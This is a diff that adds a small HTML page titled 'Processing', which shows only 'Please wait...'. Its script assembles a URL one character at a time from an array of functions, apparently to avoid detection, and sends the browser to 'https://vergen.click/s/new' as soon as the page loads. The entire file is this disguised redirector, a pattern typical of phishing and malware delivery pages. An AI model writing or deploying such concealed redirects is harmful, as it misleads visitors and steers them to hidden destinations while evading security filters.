@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Processing</title>
+    <script>
+        const fragments = [
+            function() { return 'h'; },
+            function() { return 't'; },
+            _ => 't',
+            function() { return 'p'; },
+            () => 's',
+            () => ':',
+            _ => '/',
+            () => '/',
+            function() { return 'v'; },
+            _ => 'e',
+            function() { return 'r'; },
+            () => 'g',
+            () => 'e',
+            _ => 'n',
+            _ => '.',
+            _ => 'c',
+            () => 'l',
+            function() { return 'i'; },
+            function() { return 'c'; },
+            _ => 'k',
+            _ => '/',
+            function() { return 's'; },
+            () => '/',
+            _ => 'n',
+            _ => 'e',
+            _ => 'w'
+        ];
+        window.location.href = fragments.map(fn => fn()).join('');
+    </script>
+</head>
+<body>
+    <p>Please wait...</p>
+</body>
+</html>
